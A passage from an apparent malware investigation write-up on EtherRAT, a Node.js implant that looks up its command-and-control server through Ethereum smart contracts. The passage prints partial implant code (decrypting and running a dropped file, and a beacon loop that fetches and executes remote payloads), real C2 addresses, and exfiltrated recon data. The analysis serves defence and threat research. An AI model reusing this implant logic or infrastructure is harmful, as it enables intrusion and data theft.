+</span></span><span class="line"><span class="ln">35</span><span class="cl">            <span class="nx">process</span><span class="p">.</span><span class="nx">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">36</span><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="ln">37</span><span class="cl">        
+</span></span><span class="line"><span class="ln">38</span><span class="cl">        <span class="kr">const</span> <span class="nx">encrypted</span> <span class="o">=</span> <span class="nx">fs</span><span class="p">.</span><span class="nx">readFileSync</span><span class="p">(</span><span class="nx">ENCRYPTED_BLOB</span><span class="p">,</span> <span class="s1">&#39;utf8&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">39</span><span class="cl">        <span class="kr">const</span> <span class="nx">decrypted</span> <span class="o">=</span> <span class="nx">decrypt</span><span class="p">(</span><span class="nx">encrypted</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">40</span><span class="cl">        <span class="nx">fs</span><span class="p">.</span><span class="nx">writeFileSync</span><span class="p">(</span><span class="nx">DECRYPTED_IMPLANT</span><span class="p">,</span> <span class="nx">decrypted</span><span class="p">,</span> <span class="p">{</span> <span class="nx">mode</span><span class="o">:</span> <span class="mo">0o700</span> <span class="p">});</span>
+</span></span><span class="line"><span class="ln">41</span><span class="cl">        
+</span></span><span class="line"><span class="ln">42</span><span class="cl">        <span class="nx">execute</span><span class="p">();</span>
+</span></span><span class="line"><span class="ln">43</span><span class="cl">    <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln">44</span><span class="cl">    <span class="c1">//...[snip]...
+</span></span></span><span class="line"><span class="ln">45</span><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="ln">46</span><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="ln">47</span><span class="cl">
+</span></span><span class="line"><span class="ln">48</span><span class="cl"><span class="kd">function</span> <span class="nx">execute</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln">49</span><span class="cl"><span class="c1">//...[snip]...
+</span></span></span><span class="line"><span class="ln">50</span><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="ln">51</span><span class="cl">
+</span></span><span class="line"><span class="ln">52</span><span class="cl"><span class="nx">main</span><span class="p">();</span>
+</span></span><span class="line"><span class="ln">53</span><span class="cl"><span class="nx">DROP_END</span></span></span></code></pre></div></div>
+<p><strong>I recreated the decryption routine using the hardcoded key/IV and successfully retrieved the Stage 3 script.</strong></p>
+
+<h3 class="relative group"><span style="color:red">Stage 3: The Main Implant</span>
+    <div id="stage-3-the-main-implant" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#stage-3-the-main-implant" aria-label="Anchor">#</a>
+    </span>
+    
+</h3>
+
+<h4 class="relative group">Blockchain-Based C2
+    <div id="blockchain-based-c2" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#blockchain-based-c2" aria-label="Anchor">#</a>
+    </span>
+    
+</h4>
+<p>The decrypted script contains header comments identifying it as <strong>EtherRAT</strong>.</p>
+<p><figure><img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="auto"
+    alt="alt text"
+    width="715"
+    height="167"
+    src="/investigations/cdef-callmeonthechain---etherrat/image-5.png"
+    srcset="/investigations/cdef-callmeonthechain---etherrat/image-5.png 800w, /investigations/cdef-callmeonthechain---etherrat/image-5.png 1280w"
+    sizes="(min-width: 768px) 50vw, 65vw"
+    data-zoom-src="/investigations/cdef-callmeonthechain---etherrat/image-5.png"></figure>
+</p>
+<p>This is a highly evasive implant that uses a <strong>blockchain-based command and control</strong> architecture via Ethereum smart contracts. Instead of hardcoding a traditional URL, it connects to a smart contract on the Ethereum mainnet. It essentially asks the blockchain, &ldquo;Where should I send the victim right now?&rdquo; The smart contract responds with the active C2 URL. This means the infrastructure is dynamically hosted on the blockchain, and the attacker can update the C2 at any time without altering the malware on the host.</p>
+<p>The malware contains configurations for two smart contracts: a PRIMARY and a FALLBACK.</p>
+<p><figure><img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="auto"
+    alt="alt text"
+    width="733"
+    height="526"
+    src="/investigations/cdef-callmeonthechain---etherrat/image-6.png"
+    srcset="/investigations/cdef-callmeonthechain---etherrat/image-6.png 800w, /investigations/cdef-callmeonthechain---etherrat/image-6.png 1280w"
+    sizes="(min-width: 768px) 50vw, 65vw"
+    data-zoom-src="/investigations/cdef-callmeonthechain---etherrat/image-6.png"></figure>
+</p>
+
+<h4 class="relative group">Contract Overview &amp; OSINT
+    <div id="contract-overview--osint" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#contract-overview--osint" aria-label="Anchor">#</a>
+    </span>
+    
+</h4>
+<p>I checked the primary contract (<code>0x22f96d61cf118efabc7c5bf3384734fad2f6ead4</code>) on Etherscan. It was created on Dec-05-2025.</p>
+<p><figure><img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="auto"
+    alt="alt text"
+    width="1380"
+    height="390"
+    src="/investigations/cdef-callmeonthechain---etherrat/image-7_hu_efd20ffb7020acf4.png"
+    srcset="/investigations/cdef-callmeonthechain---etherrat/image-7_hu_efd20ffb7020acf4.png 800w, /investigations/cdef-callmeonthechain---etherrat/image-7_hu_bcd99599b8b560dc.png 1280w"
+    sizes="(min-width: 768px) 50vw, 65vw"
+    data-zoom-src="/investigations/cdef-callmeonthechain---etherrat/image-7.png"></figure>
+</p>
+<p>Looking at the transactions, I saw multiple calls to a <code>Set String</code> method, confirming the attacker is actively rotating their C2 URLs.</p>
+<p><figure><img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="auto"
+    alt="alt text"
+    width="1341"
+    height="475"
+    src="/investigations/cdef-callmeonthechain---etherrat/image-8_hu_94e78085a699ee18.png"
+    srcset="/investigations/cdef-callmeonthechain---etherrat/image-8_hu_94e78085a699ee18.png 800w, /investigations/cdef-callmeonthechain---etherrat/image-8_hu_9b2ce3b377b540f5.png 1280w"
+    sizes="(min-width: 768px) 50vw, 65vw"
+    data-zoom-src="/investigations/cdef-callmeonthechain---etherrat/image-8.png"></figure>
+</p>
+<p>By inspecting the contract&rsquo;s <strong>Events</strong> logs, the changes to the contract are clearly visible. The attacker updated it 9 times, cycling through unique URLs, including direct IPs and tracking links:</p>
+<ul>
+<li>http://91.215.85.42:3000</li>
+<li>http://173.249.8.102/</li>
+<li>https://grabify[.]link/SEFKGU</li>
+<li>https://grabify[.]link/SEFKGU?dry87932wydes/fdsgdsfdsjfkl</li>
+</ul>
+<p><figure><img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="auto"
+    alt="alt text"
+    width="1394"
+    height="544"
+    src="/investigations/cdef-callmeonthechain---etherrat/image-9_hu_8aab68459a4fef0c.png"
+    srcset="/investigations/cdef-callmeonthechain---etherrat/image-9_hu_8aab68459a4fef0c.png 800w, /investigations/cdef-callmeonthechain---etherrat/image-9_hu_266ca415da114e8f.png 1280w"
+    sizes="(min-width: 768px) 50vw, 65vw"
+    data-zoom-src="/investigations/cdef-callmeonthechain---etherrat/image-9.png"></figure>
+</p>
+<p>Looking at the fallback contract in the code, it contains a larger list of potential C2 endpoints, including:
+- https://15.116.46.18:443<br>
+- https://63.176.62.199:443<br>
+- https://3.78.187.211:443<br>
+- https://3.66.227.157:443<br>
+- https://52.59.200.147<br>
+- https://3.78.229.44:3000<br>
+- https://18.198.1.194:3000<br>
+- https://63.179.143.20:3000<br>
+- https://35.159.53.179:3000<br>
+- https://3.125.41.44:3000<br>
+- https://3.125.39.195:3000<br>
+- http://91.215.85.42:3000</p>
+<p>EtherRAT utilizes several core functions to manage this process:</p>
+<p><figure><img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="auto"
+    alt="alt text"
+    width="350"
+    height="376"
+    src="/investigations/cdef-callmeonthechain---etherrat/image-10.png"
+    srcset="/investigations/cdef-callmeonthechain---etherrat/image-10.png 800w, /investigations/cdef-callmeonthechain---etherrat/image-10.png 1280w"
+    sizes="(min-width: 768px) 50vw, 65vw"
+    data-zoom-src="/investigations/cdef-callmeonthechain---etherrat/image-10.png"></figure>
+</p>
+
+<h4 class="relative group">Initialization and C2 Resolution
+    <div id="initialization-and-c2-resolution" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#initialization-and-c2-resolution" aria-label="Anchor">#</a>
+    </span>
+    
+</h4>
+<p>The script&rsquo;s main() function starts by checking the locale, refusing to execute in this countries: ru, be, kk, ky, tg, uz, hy, az, ka. It then loops through the configured contracts and calls <code>queryContract()</code>, which makes public RPC requests to resolve the URL.</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="kr">async</span> <span class="kd">function</span> <span class="nx">main</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln"> 2</span><span class="cl">    <span class="c1">// CIS locale check
+</span></span></span><span class="line"><span class="ln"> 3</span><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">checkLocale</span><span class="p">())</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln"> 4</span><span class="cl">    <span class="c1">///...[snip]...
+</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl">    
+</span></span><span class="line"><span class="ln"> 6</span><span class="cl">    <span class="c1">// Load or create state
+</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">loadState</span><span class="p">())</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln"> 8</span><span class="cl">    <span class="c1">///...[snip]...
+</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl">
+</span></span><span class="line"><span class="ln">10</span><span class="cl">    <span class="c1">// C2 resolution
+</span></span></span><span class="line"><span class="ln">11</span><span class="cl">    <span class="kd">let</span> <span class="nx">c2Url</span> <span class="o">=</span> <span class="kc">null</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln">12</span><span class="cl">    <span class="kd">let</span> <span class="nx">contractIndex</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln">13</span><span class="cl">    
+</span></span><span class="line"><span class="ln">14</span><span class="cl">    <span class="k">while</span> <span class="p">(</span><span class="o">!</span><span class="nx">c2Url</span> <span class="o">&amp;&amp;</span> <span class="nx">contractIndex</span> <span class="o">&lt;</span> <span class="nx">CONTRACTS</span><span class="p">.</span><span class="nx">length</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln">15</span><span class="cl">        <span class="kr">const</span> <span class="nx">config</span> <span class="o">=</span> <span class="nx">CONTRACTS</span><span class="p">[</span><span class="nx">contractIndex</span><span class="p">];</span>
+</span></span><span class="line"><span class="ln">16</span><span class="cl">        <span class="kr">const</span> <span class="nx">resolvedUrl</span> <span class="o">=</span> <span class="kr">await</span> <span class="nx">queryContract</span><span class="p">(</span><span class="nx">config</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="c1">///...[snip]...
+</span></span></span><span class="line"><span class="ln">18</span><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">resolvedUrl</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln">19</span><span class="cl">            <span class="kr">const</span> <span class="nx">test</span> <span class="o">=</span> <span class="kr">await</span> <span class="nx">testC2Connection</span><span class="p">(</span><span class="nx">resolvedUrl</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">20</span><span class="cl">            
+</span></span><span class="line"><span class="ln">21</span><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nx">test</span><span class="p">.</span><span class="nx">success</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln">22</span><span class="cl">                <span class="c1">///...[snip]...
+</span></span></span><span class="line"><span class="ln">23</span><span class="cl">                <span class="nx">saveState</span><span class="p">();</span>
+</span></span><span class="line"><span class="ln">24</span><span class="cl">    <span class="p">}</span></span></span></code></pre></div></div>
+<p>Once a URL is successfully resolved, the malware tests the connection, sends a unique <em>BotId</em> inside a state structure, and saves this state to <code>$MALWARE_DIR/.a3f8b2c1d4e5.json</code>.</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="ln">1</span><span class="cl"><span class="kd">let</span> <span class="nx">state</span><span class="o">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln">2</span><span class="cl">    <span class="nx">botId</span><span class="o">:</span> <span class="kc">null</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln">3</span><span class="cl">    <span class="nx">c2Url</span><span class="o">:</span> <span class="kc">null</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln">4</span><span class="cl">    <span class="nx">contractIndex</span><span class="o">:</span> <span class="nx">number</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln">5</span><span class="cl">    <span class="nx">stage</span><span class="o">:</span> <span class="nx">number</span><span class="p">;</span> <span class="c1">// starts with &#34;0&#34;
+</span></span></span><span class="line"><span class="ln">6</span><span class="cl">    <span class="nx">firstRun</span><span class="o">:</span> <span class="kr">boolean</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln">7</span><span class="cl"><span class="p">}</span></span></span></code></pre></div></div>
+
+<h4 class="relative group">Beacon Loop and ABI Analysis
+    <div id="beacon-loop-and-abi-analysis" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#beacon-loop-and-abi-analysis" aria-label="Anchor">#</a>
+    </span>
+    
+</h4>
+<p>The main beaconing loop continuously fetches payloads from the attacker&rsquo;s server and executes them, utilizing random delays to evade detection.</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="ln"> 1</span><span class="cl">    <span class="c1">// Main beacon loop
+</span></span></span><span class="line"><span class="ln"> 2</span><span class="cl">    <span class="kd">let</span> <span class="nx">failureCount</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln"> 3</span><span class="cl">    
+</span></span><span class="line"><span class="ln"> 4</span><span class="cl">    <span class="k">while</span> <span class="p">(</span><span class="kc">true</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln"> 5</span><span class="cl">        <span class="k">try</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln"> 6</span><span class="cl">            <span class="kr">const</span> <span class="nx">response</span> <span class="o">=</span> <span class="kr">await</span> <span class="nx">beacon</span><span class="p">(</span><span class="nx">c2Url</span><span class="p">,</span> <span class="nx">state</span><span class="p">.</span><span class="nx">botId</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln"> 7</span><span class="cl">            <span class="nx">failureCount</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln"> 8</span><span class="cl">            
+</span></span><span class="line"><span class="ln"> 9</span><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nx">response</span><span class="p">.</span><span class="nx">status</span> <span class="o">===</span> <span class="mi">200</span> <span class="o">&amp;&amp;</span> <span class="nx">response</span><span class="p">.</span><span class="nx">body</span> <span class="o">&amp;&amp;</span> <span class="nx">response</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">length</span> <span class="o">&gt;</span> <span class="mi">10</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln">10</span><span class="cl">                <span class="kr">const</span> <span class="nx">success</span> <span class="o">=</span> <span class="kr">await</span> <span class="nx">executePayload</span><span class="p">(</span><span class="nx">response</span><span class="p">.</span><span class="nx">body</span><span class="p">,</span> <span class="nx">state</span><span class="p">.</span><span class="nx">botId</span><span class="p">,</span> <span class="nx">c2Url</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">11</span><span class="cl">                
+</span></span><span class="line"><span class="ln">12</span><span class="cl">                <span class="k">if</span> <span class="p">(</span><span class="nx">success</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln">13</span><span class="cl">                    <span class="kr">await</span> <span class="nx">reportStage</span><span class="p">(</span><span class="nx">c2Url</span><span class="p">,</span> <span class="nx">state</span><span class="p">.</span><span class="nx">botId</span><span class="p">,</span> <span class="nx">state</span><span class="p">.</span><span class="nx">stage</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">14</span><span class="cl">                    <span class="nx">state</span><span class="p">.</span><span class="nx">stage</span><span class="o">++</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln">15</span><span class="cl">                    <span class="c1">//...[snip]...
+</span></span></span><span class="line"><span class="ln">16</span><span class="cl">                    <span class="nx">saveState</span><span class="p">();</span>
+</span></span><span class="line"><span class="ln">17</span><span class="cl">                    
+</span></span><span class="line"><span class="ln">18</span><span class="cl">                    <span class="k">if</span> <span class="p">(</span><span class="nx">state</span><span class="p">.</span><span class="nx">stage</span> <span class="o">&lt;</span> <span class="mi">4</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln">19</span><span class="cl">                        <span class="kr">const</span> <span class="nx">delay</span> <span class="o">=</span> <span class="nx">randomDelay</span><span class="p">(</span><span class="nx">STAGE_DELAY_MIN</span><span class="p">,</span> <span class="nx">STAGE_DELAY_MAX</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">20</span><span class="cl">                        <span class="kr">await</span> <span class="k">new</span> <span class="nb">Promise</span><span class="p">(</span><span class="nx">r</span> <span class="p">=&gt;</span> <span class="nx">setTimeout</span><span class="p">(</span><span class="nx">r</span><span class="p">,</span> <span class="nx">delay</span><span class="p">));</span>
+</span></span><span class="line"><span class="ln">21</span><span class="cl">                        <span class="k">continue</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln">22</span><span class="cl">                    <span class="p">}</span>
+</span></span><span class="line"><span class="ln">23</span><span class="cl">                <span class="p">}</span>
+</span></span><span class="line"><span class="ln">24</span><span class="cl">            <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nx">response</span><span class="p">.</span><span class="nx">status</span> <span class="o">===</span> <span class="mi">204</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln">25</span><span class="cl">            <span class="c1">//...[snip]...
+</span></span></span><span class="line"><span class="ln">26</span><span class="cl">            
+</span></span><span class="line"><span class="ln">27</span><span class="cl">        <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln">28</span><span class="cl">        <span class="c1">//...[snip]...
+</span></span></span><span class="line"><span class="ln">29</span><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="ln">30</span><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="ln">31</span><span class="cl"><span class="p">}</span></span></span></code></pre></div></div>
+<p>In the code, I noticed the specific function selector used for the RPC call (<code>const FUNC_SELECTOR = '0x7d434425';</code>). Since the smart contract is deployed publicly on the blockchain, I decompiled the bytecode to view the <strong>ABI</strong> (Application Binary Interface).</p>
+<p><figure><img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="auto"
+    alt="alt text"
+    width="489"
+    height="749"
+    src="/investigations/cdef-callmeonthechain---etherrat/image-11.png"
+    srcset="/investigations/cdef-callmeonthechain---etherrat/image-11.png 800w, /investigations/cdef-callmeonthechain---etherrat/image-11.png 1280w"
+    sizes="(min-width: 768px) 50vw, 65vw"
+    data-zoom-src="/investigations/cdef-callmeonthechain---etherrat/image-11.png"></figure>
+</p>
+<p>This revealed the exact function signatures: <code>getString(address)</code> maps to the 0x7d434425 selector (used by the bot to read the C2), and <code>setString(string)</code> maps to 0x7fcaf666 (used by the attacker to update the C2).</p>
+
+<h3 class="relative group"><span style="color:red">Post-Exploitation</span>
+    <div id="post-exploitation" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#post-exploitation" aria-label="Anchor">#</a>
+    </span>
+    
+</h3>
+<p>I continued to analyze network traffic and at 18:37, I observed the victim host (<em>172.31.44.238</em>) making multiple HTTP/JSON POST requests to public Ethereum RPC servers (Tenderly, Llamarpc, Flashbots) to query the smart contract for the active C2.</p>
+<p><figure><img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="auto"
+    alt="alt text"
+    width="1224"
+    height="310"
+    src="/investigations/cdef-callmeonthechain---etherrat/image-12_hu_b8d71294d0e97f38.png"
+    srcset="/investigations/cdef-callmeonthechain---etherrat/image-12_hu_b8d71294d0e97f38.png 800w, /investigations/cdef-callmeonthechain---etherrat/image-12.png 1280w"
+    sizes="(min-width: 768px) 50vw, 65vw"
+    data-zoom-src="/investigations/cdef-callmeonthechain---etherrat/image-12.png"></figure>
+</p>
+<p>One second later, the host connected to <em>91.215.85.42:3000</em> (the URL retrieved from the primary contract). While this resulted in a 404, it successfully registered and retrieved the BotId 4ebfbc8aedf60511.</p>
+<p><figure><img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="auto"
+    alt="alt text"
+    width="1271"
+    height="80"
+    src="/investigations/cdef-callmeonthechain---etherrat/image-13_hu_6bb259c413bdebf1.png"
+    srcset="/investigations/cdef-callmeonthechain---etherrat/image-13_hu_6bb259c413bdebf1.png 800w, /investigations/cdef-callmeonthechain---etherrat/image-13.png 1280w"
+    sizes="(min-width: 768px) 50vw, 65vw"
+    data-zoom-src="/investigations/cdef-callmeonthechain---etherrat/image-13.png"></figure>
+</p>
+<p>Because the primary C2 didn&rsquo;t serve a payload, the implant logically rolled over to its FALLBACK contract configuration. The victim then established a secure connection to <em>63.176.62.199 over port 443</em>, retrieving its subsequent stages masqueraded as .css and .png files.</p>
+<p><figure><img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="auto"
+    alt="alt text"
+    width="1488"
+    height="171"
+    src="/investigations/cdef-callmeonthechain---etherrat/image-14_hu_197e952b4c798257.png"
+    srcset="/investigations/cdef-callmeonthechain---etherrat/image-14_hu_197e952b4c798257.png 800w, /investigations/cdef-callmeonthechain---etherrat/image-14_hu_d43ac4aa68f71405.png 1280w"
+    sizes="(min-width: 768px) 50vw, 65vw"
+    data-zoom-src="/investigations/cdef-callmeonthechain---etherrat/image-14.png"></figure>
+</p>
+
+<h4 class="relative group">Stage 0: Reconnaissance
+    <div id="stage-0-reconnaissance" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none">
+        <a class="text-primary-300 dark:text-neutral-700 !no-underline" href="#stage-0-reconnaissance" aria-label="Anchor">#</a>
+    </span>
+    
+</h4>
+<p>The first payload executed was an aggressive reconnaissance script collecting host information, network interfaces, and checking for the existence of AWS, Kubernetes, Docker, and Git configurations.</p>
+<p><figure><img
+    class="my-0 rounded-md"
+    loading="lazy"
+    decoding="async"
+    fetchpriority="auto"
+    alt="alt text"
+    width="934"
+    height="710"
+    src="/investigations/cdef-callmeonthechain---etherrat/image-15_hu_a45daac73ede1208.png"
+    srcset="/investigations/cdef-callmeonthechain---etherrat/image-15_hu_a45daac73ede1208.png 800w, /investigations/cdef-callmeonthechain---etherrat/image-15.png 1280w"
+    sizes="(min-width: 768px) 50vw, 65vw"
+    data-zoom-src="/investigations/cdef-callmeonthechain---etherrat/image-15.png"></figure>
+</p>
+<p>The script exfiltrated the following JSON structure back to the C2:</p>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="ln"> 2</span><span class="cl">  <span class="nt">&#34;type&#34;</span><span class="p">:</span> <span class="s2">&#34;recon&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln"> 3</span><span class="cl">  <span class="nt">&#34;timestamp&#34;</span><span class="p">:</span> <span class="s2">&#34;2026-02-10T18:37:25.434Z&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln"> 4</span><span class="cl">  <span class="nt">&#34;botId&#34;</span><span class="p">:</span> <span class="s2">&#34;4ebfbc8aedf60511&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln"> 5</span><span class="cl">  <span class="nt">&#34;hostname&#34;</span><span class="p">:</span> <span class="s2">&#34;ip-172-31-44-238&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln"> 6</span><span class="cl">  <span class="nt">&#34;username&#34;</span><span class="p">:</span> <span class="s2">&#34;maromalix&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln"> 7</span><span class="cl">  <span class="nt">&#34;homedir&#34;</span><span class="p">:</span> <span class="s2">&#34;/home/maromalix&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln"> 8</span><span class="cl">  <span class="nt">&#34;platform&#34;</span><span class="p">:</span> <span class="s2">&#34;linux&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln"> 9</span><span class="cl">  <span class="nt">&#34;arch&#34;</span><span class="p">:</span> <span class="s2">&#34;x64&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln">10</span><span class="cl">  <span class="nt">&#34;release&#34;</span><span class="p">:</span> <span class="s2">&#34;6.14.0-1018-aws&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln">11</span><span class="cl">  <span class="nt">&#34;cpus&#34;</span><span class="p">:</span> <span class="s2">&#34;Intel(R) Xeon(R) Platinum 8259CL CPU @ 2.50GHz&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln">12</span><span class="cl">  <span class="nt">&#34;cpuCount&#34;</span><span class="p">:</span> <span class="mi">2</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln">13</span><span class="cl">  <span class="nt">&#34;totalMemory&#34;</span><span class="p">:</span> <span class="s2">&#34;4 GB&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln">14</span><span class="cl">  <span class="nt">&#34;freeMemory&#34;</span><span class="p">:</span> <span class="s2">&#34;3 GB&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln">15</span><span class="cl">  <span class="nt">&#34;networkInterfaces&#34;</span><span class="p">:</span> <span class="p">[</span>
+</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="ln">17</span><span class="cl">      <span class="nt">&#34;name&#34;</span><span class="p">:</span> <span class="s2">&#34;ens5&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln">18</span><span class="cl">      <span class="nt">&#34;addresses&#34;</span><span class="p">:</span> <span class="p">[</span>
+</span></span><span class="line"><span class="ln">19</span><span class="cl">        <span class="s2">&#34;172.31.44.238&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln">20</span><span class="cl">        <span class="s2">&#34;fe80::456:62ff:fea4:482b&#34;</span>
+</span></span><span class="line"><span class="ln">21</span><span class="cl">      <span class="p">]</span>
+</span></span><span class="line"><span class="ln">22</span><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="ln">23</span><span class="cl">  <span class="p">],</span>
+</span></span><span class="line"><span class="ln">24</span><span class="cl">  <span class="nt">&#34;shell&#34;</span><span class="p">:</span> <span class="s2">&#34;/bin/bash&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln">25</span><span class="cl">  <span class="nt">&#34;lang&#34;</span><span class="p">:</span> <span class="s2">&#34;C.UTF-8&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln">26</span><span class="cl">  <span class="nt">&#34;uid&#34;</span><span class="p">:</span> <span class="mi">999</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln">27</span><span class="cl">  <span class="nt">&#34;paths&#34;</span><span class="p">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln">28</span><span class="cl">    <span class="nt">&#34;ssh&#34;</span><span class="p">:</span> <span class="kc">true</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln">29</span><span class="cl">    <span class="nt">&#34;aws&#34;</span><span class="p">:</span> <span class="kc">true</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln">30</span><span class="cl">    <span class="nt">&#34;kube&#34;</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln">31</span><span class="cl">    <span class="nt">&#34;docker&#34;</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span>
+</span></span><span class="line"><span class="ln">32</span><span class="cl">    <span class="nt">&#34;git&#34;</span><span class="p">:</span> <span class="kc">false</span>
+</span></span><span class="line"><span class="ln">33</span><span class="cl">  <span class="p">}</span>
